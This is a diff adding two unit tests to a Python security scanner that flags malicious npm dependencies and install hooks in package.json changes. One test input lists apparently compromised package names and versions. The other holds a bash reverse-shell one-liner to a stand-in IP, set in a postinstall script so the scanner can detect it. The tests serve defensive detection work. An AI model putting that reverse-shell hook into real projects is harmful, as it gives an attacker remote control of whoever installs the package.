@@ -401,6 +401,45 @@ class PushGuardTests(unittest.TestCase):
 
         self.assertIn("workflow.compromised_npm_package", rule_ids)
 
+    def test_scan_diff_blocks_july_malicious_packages_and_versions(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/package.json b/package.json",
+                "index 1111111..2222222 100644",
+                "--- a/package.json",
+                "+++ b/package.json",
+                "@@ -1,0 +1,6 @@",
+                "+{",
+                "+  \"dependencies\": {",
+                "+    \"paperclip2\": \"1.0.0\",",
+                "+    \"jscrambler\": \"8.20.0\",",
+                "+    \"@injectivelabs/sdk-ts\": \"1.20.21\"",
+                "+  }",
+                "+}",
+            ]
+        )
+
+        rule_ids = {finding.rule_id for finding in _scan_diff(diff_text)}
+        self.assertIn("workflow.july_malicious_npm_package", rule_ids)
+        self.assertIn("workflow.july_compromised_npm_version", rule_ids)
+
+    def test_scan_diff_blocks_manifest_only_reverse_shell_lifecycle(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/package.json b/package.json",
+                "index 1111111..2222222 100644",
+                "--- a/package.json",
+                "+++ b/package.json",
+                "@@ -1,0 +1,3 @@",
+                "+{",
+                "+  \"scripts\": { \"postinstall\": \"bash -i >& /dev/tcp/198.51.100.10/7007 0>&1\" }",
+                "+}",
+            ]
+        )
+
+        rule_ids = {finding.rule_id for finding in _scan_diff(diff_text)}
+        self.assertIn("workflow.manifest_reverse_shell_lifecycle", rule_ids)
+
     def test_scan_diff_blocks_atomicarch_aur_pkgbuild_loader(self):
         diff_text = "\n".join(
             [
